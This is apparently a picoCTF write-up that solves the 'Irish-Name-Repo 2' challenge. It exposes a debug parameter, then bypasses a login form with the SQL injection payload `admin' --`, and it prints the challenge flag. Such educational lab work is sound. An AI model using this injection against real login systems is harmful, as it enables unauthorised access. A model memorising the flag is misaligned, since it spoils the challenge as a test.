** Tristan Gomez **

# Irish-Name-Repo 2

### Author: Xingyang Pan

### Description:

`
There is a website running at https://jupiter.challenges.picoctf.org/problem/53751/ (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751
`

### Hints: 
  * The password is being filtered

### Step 1

When first visiting the challenge site, we are greeted by the same "List 'o the Irish!" page from the first "Irish-Name-Repo" challenge. Click the hamburger menu icon on the top left of the screen and select the "Admin Login" page. 

### Step 2

The admin login page has the same `username` and `password` fields as before, but let's inspect the HTML to be sure. After inspecting the page, we see that the form is exactly the same as the first challenge. There is a hidden `debug` parameter that is set to `0` by default. The form performs a **POST** to `/login.php`. Using the Python requests library, lets craft a payload.

```
setDebugFlagPayload = {
  'username' : 'test',
  'password' : 'test',
  'debug' : '1'
}
```

The response payload 
```
<pre>
username: test
password: test
SQL query: SELECT * FROM users WHERE name='test' AND password='test'
</pre>
<h1>Login failed.</h1>
```

Sadly there is no new information from setting the debug flag, but this is enough information to work with. 

### Step 3

Let's try the same payload (`admin' --`) as the first challenge by manually entering it into the form for the `username` parameter. Bam, the payload works! We are greeted by

```
Logged in!
Your flag is: picoCTF{m0R3_SQL_plz_c34df170}
```
**FLAG: picoCTF{m0R3_SQL_plz_c34df170}**
